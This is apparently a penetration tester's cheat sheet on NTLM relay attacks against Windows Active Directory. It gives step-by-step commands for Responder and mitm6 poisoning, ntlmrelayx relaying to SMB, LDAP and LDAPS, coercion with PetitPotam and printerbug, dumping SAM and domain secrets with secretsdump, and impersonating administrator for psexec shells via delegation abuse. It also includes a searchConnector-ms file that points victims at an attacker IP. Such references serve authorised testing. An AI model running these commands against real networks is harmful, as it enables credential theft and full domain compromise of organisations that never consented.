## Relaying attacks
* [SMB relaying](#SMB-relaying)
* [LDAP Relaying](#LDAP-Relaying)
  * [LDAP Relay force HTTP requests](#LDAP-Relay-force-HTTP-requests)
  * [LDAP Relay with Mitm6](#LDAP-Relay-with-Mitm6)
* [LDAPS Relaying](#LDAPS-Relaying)
  * [Resource Based Constrained Delegation Webclient Attack](#Resource-Based-Constrained-Delegation-Webclient-Attack)
- https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/

#### Check if LLMNR and NBT-NS is used
- Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS).
- Use ```-A``` for analyze mode.
```
Responder -I eth0 -A
```

### SMB relaying
#### Check for SMB hosts without SMB signing
```
crackmapexec smb <IP RANGE> --gen-relay-list smb_hosts_nosigning.txt
```

#### Poison Requests
```
Responder -I eth0
```

#### Relay requests SMB and dump SAM
- we have to modify the Responder.conf file and disable the HTTP and SMB servers (as NTLM relay will be our SMB and HTTP server).
- the ```-d``` flag has now been changed from “Enable answers for NETBIOS domain suffix queries. Answering to domain suffixes will likely break stuff on the network. Default: False” to “Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response. Default: False”. It should also be noted that ```-d``` as it is now CAN have an impact on your client’s network, as you are effectively poisoning the WPAD file over DHCP, which does not always revert back immediately once you stop the attack. It will likely require a reboot.
```
Responder -I eth0
ntlmrelayx.py -tf smb_hosts_nosigning.txt 
```

#### Relay requests SMB and keep SMB sessions open
- Use the ```socks``` option to be able to use the ```socks``` command to get a nice overview of the relayed attempts. It will also keep the SMB connection open indefinitely. 

```
Responder -I eth0
ntlmrelayx.py -tf smb_hosts_nosigning.txt --socks

# Get overview of all relay attempts
ntlmrelayx> socks

# Change socks proxy
sudo vim /etc/proxychains4.conf
socks4 127.0.0.1 1080

# Use proxychains and it will ignore the password value and use the relay credential instead
proxychains python3 secretsdump.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>

# Also possible to access shares on the network, for example if user is not local admin
proxychains python3 smbclient.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
```

### LDAP Relaying
### LDAP Relay force HTTP requests
- Requires HTTP requests, because SMB signing is enabled by default.

#### Scan for target with webclient active
- https://github.com/Hackndo/WebclientServiceScanner
```
webclientservicescanner <DOMAIN>/<USER>:<PASSWORD>@<IP RANGE> -dc-ip <DC IP>
```

#### If no targets, place file on share to activate webclients
- https://www.bussink.net/webclient_activation/
- Filename ```Documents.searchConnector-ms```
```
<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <iconReference>imageres.dll,-1002</iconReference>
    <description>Microsoft Outlook</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <iconReference>https://<ATTACKER IP>/0001.ico</iconReference>
    <templateInfo>
        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>https://www.bussink.net/</url>
    </simpleLocation>
</searchConnectorDescription>
```

#### Enable the LDAP relay
```
Responder -I eth0
ntlmrelayx.py -t ldap://<DC IP> -smb2support
```

#### Trigger target to authenticate to attacker machine
- https://github.com/topotam/PetitPotam
- https://github.com/dirkjanm/krbrelayx
```
python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@80/a <TARGET>

python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
```

- However, since printerbug and PetitPotam both needed authentication to work, we could have just used a tool like ldapdomaindump to directly bind to LDAP ourselves and dump the data directly. To do this unauthenticated use mitm6!

### LDAP Relay with Mitm6
- In modern Windows operating systems, IPv6 is enabled by default. This means that systems periodically poll for an IPv6 lease, as IPv6 is a newer protocol than IPv4, and Microsoft decided it was a good idea to give IPv6 precedence over IPv4.
- However, in the vast majority of organizations, IPv6 is left unused, which means that an adversary could hijack the DHCP requests for IPv6 addresses and force authentication attempts to the attacker-controlled system. We do that by setting our system as the primary DNS server.
- Spoof any requests for internal resources

```
sudo python3 mitm6.py -d <DOMAIN> --ignore-nofqdn
ntlmrelayx.py -t ldap://<DC IP> -wh <DOMAIN> -6
```

### LDAPS Relaying
- Relaying LDAPS can add a new computer account by abusing the fact that, by default, user are allowed to join domain up to 10 new computer objects
- When possible, use the FQDN instead of the IP address. The IP address works most of the time, but FQDN looks cleaner and avoids SNI certificate conflicts.

#### Enable the LDAPS relay
- Can wait for mitm6 to poison or force it
```
sudo python3 mitm6.py -d <DOMAIN> --ignore-nofqdn

ntlmrelayx.py -t ldaps://<DC IP> --add-computer <COMPUTER NAME>
```

#### Trigger target to authenticate to attacker machine
- https://github.com/topotam/PetitPotam
- https://github.com/dirkjanm/krbrelayx
```
python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@80/a <TARGET>

python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
```

- When computer account is created. This account can be used to enumerate the domain!

### Resource Based Constrained Delegation Webclient Attack
- Requirements:
  - On a Domain Controller to have the LDAP server signing not enforced (default value) (Requires authentication to check)
  - On a Domain Controller to have the LDAPS channel binding not required (default value)
  - Able to add new machines accounts (default value this quota is 10) (Requires authentication to check)
  - On the network, machines with WebClient running (some OS version had this service running by default or use the webclient starting trick from DTMSecurity) (Requires authentication to check)
  - A DNS record pointing to the attacker’s machine (By default authenticated users can do this) (Requires authentication to add)

#### Check LDAPS Binding
- https://github.com/zyn3rgy/LdapRelayScan
```
python3 LdapRelayScan.py -method LDAPS -dc-ip <IP>
```

#### Start mitm6 and NTLMRelay
```
sudo python3 mitm6.py -d <DOMAIN> --ignore-nofqdn
sudo ntlmrelayx.py -t ldaps://<DC IP> --delegate-access 
```

- When computer account is created. This account can be used to enumerate the domain!

#### Check for a user to impersonate
- Preferably a user that would be admin on the machine (Check BloodHound). Maybe another command to check if user is admin on a machine? Is that possible? We should check!
- User should not be part of "Protected Users group" or accounts with the "This account is sensitive and cannot be delegated" right
```
$creds = Get-Credential
Get-DomainUser -Credential $creds -Domain <DOMAIN> -Server <DC IP> | ? {!($_.memberof -Match "Protected Users")} | select samaccountname, memberof
```

#### Impersonate any user and exploit
- Impersonate any user except those in groups "Protected Users" or accounts with the "This account is sensitive and cannot be delegated" right
```
getST.py <DOMAIN>/<MACHINE ACCOUNT>@<TARGET FQDN> -spn cifs/<TARGET FQDN> -impersonate administrator -dc-ip <DC IP>
Export KRB5CCNAME=administrator.ccache
python3 Psexec.py -k -no-pass <TARGET FQDN>
python3 Secretsdump.py -k <TARGET FQDN>
```
